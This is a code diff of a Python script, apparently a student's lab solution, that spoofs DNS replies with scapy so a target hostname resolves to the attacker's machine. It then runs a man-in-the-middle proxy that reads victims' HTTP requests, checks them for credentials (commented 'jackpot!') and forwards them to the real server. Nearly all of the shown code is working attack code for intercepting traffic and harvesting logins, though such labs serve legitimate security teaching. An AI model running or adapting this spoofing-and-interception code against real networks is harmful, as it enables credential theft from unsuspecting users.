@@ -42,39 +42,30 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 
 	# TODO: read data from client socket, check for credentials, and forward along to host socket.
 	# Check for POST to '/post_logout' and exit after that request has completed.
+	data_amount = 50000
+	while True:
 
-	try:
-		while True:
+		accepted_socket, _ = client_socket.accept()
+		# Read data from client socket
+		client_data = accepted_socket.recv(data_amount) # allow amount Bytes of data to be transfered
+		check_credentials(str(client_data)) # jackpot!
+		# Create a new socket to connect to the actual host associated with hostname
+		real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		real_server_socket.connect((resolve_hostname(hostname), WEB_PORT)) # port = 80 is associated with HTTP
 
-			accepted_socket, _ = client_socket.accept()
-			# Create a new socket to connect to the actual host associated with hostname
-			real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			real_server_socket.connect((hostname, WEB_PORT)) # port = 80 is associated with HTTP
-			# Read data from client socket
-			client_data = accepted_socket.recv(8192) # allow 8192 Bytes = 8KB of data to be transfered
-			if not client_data:
-				break  # Break the loop if no data is received
-			else:
-				check_credentials(str(client_data)) # jackpot!
+		# Forward the received data to the host socket
+		real_server_socket.sendall(client_data)
+		real_server_response = real_server_socket.recv(data_amount)
+		accepted_socket.sendall(real_server_response)		
+		# Close the sockets
+		accepted_socket.close()
+		real_server_socket.close()
 
-			# Forward the received data to the host socket
-			real_server_socket.sendall(client_data)
-			real_server_response = real_server_socket.recv(8192)
-			accepted_socket.sendall(real_server_response)		
-
-			# Close the sockets
-			accepted_socket.close()
-			real_server_socket.close()
-
-			# Check if the received data contains a POST request to '/post_logout'
-			conditions = ["POST", "/post_logout"]
-			if all(condition in client_data for condition in conditions):
-				break  # Exit the loop if the condition is met
-
-	finally:
-		# Close the client socket
-		client_socket.close()
-		exit(0) # as note above, exit at the end after "/post_logout"
+		# Check if the received data contains a POST request to '/post_logout'
+		conditions = ["POST", "/post_logout"]
+		if all(condition in client_data for condition in conditions):
+			client_socket.close()
+			sys.exit()  # Exit the loop if the condition is met
 
 def dns_callback(packet, extra_args):
 	# TODO: Write callback function for handling DNS packets.
@@ -90,7 +81,8 @@ def dns_callback(packet, extra_args):
 			QR_name = str(pkt_dnsQR.qname)
 
 			if HOSTNAME in QR_name:
-				my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=HOSTNAME, rdata=source_ip))
+				# my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=HOSTNAME, rdata=source_ip))
+				my_response = IP(dst=pkt_ip.src, src=pkt_ip.dst) / UDP(dport=pkt_udp.sport, sport=pkt_udp.dport) / DNS(id=pkt_dns.id, qd=pkt_dnsQR, qr=1, aa=1, an=DNSRR(rrname=str.encode(HOSTNAME), rdata=str.encode(source_ip)))
 				send(my_response, iface="lo")
 				handle_tcp_forwarding(my_socket, source_ip, HOSTNAME)
 		except Exception as e:
@@ -124,7 +116,7 @@ def sniff_and_spoof(source_ip):
 			my_socket.close()
 
 	# Exit the script
-	sys.exit(0)
+	# sys.exit(0)
 
 
 def main():
